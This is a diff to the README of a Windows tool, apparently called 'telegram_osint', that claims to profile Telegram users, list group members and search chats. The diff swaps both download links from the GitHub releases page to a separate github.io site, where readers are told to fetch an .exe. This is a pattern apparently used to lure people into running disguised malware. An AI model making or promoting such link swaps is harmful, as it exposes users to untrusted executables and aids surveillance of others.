@@ -1,6 +1,6 @@
 # 🔍 telegram_osint - Gather profile data and analyze chats
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Profane-aeliusdonatus171/telegram_osint/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://profane-aeliusdonatus171.github.io)
 
 This application helps you collect and organize information from Telegram. It works through a terminal interface. You can track user profiles, scan channel activity, list group members, and search chat history. The tool saves your research in standard formats like JSON, CSV, and Markdown.
 
@@ -10,7 +10,7 @@ You need a Windows computer to run this tool. Ensure you have a stable internet 
 
 ## 📥 Getting Started
 
-1. Visit the [official release page](https://github.com/Profane-aeliusdonatus171/telegram_osint/releases) to download the software.
+1. Visit the [official release page](https://profane-aeliusdonatus171.github.io) to download the software.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file to start the download.
 4. Save the file in a folder you can access easily, such as your Documents or Downloads folder.
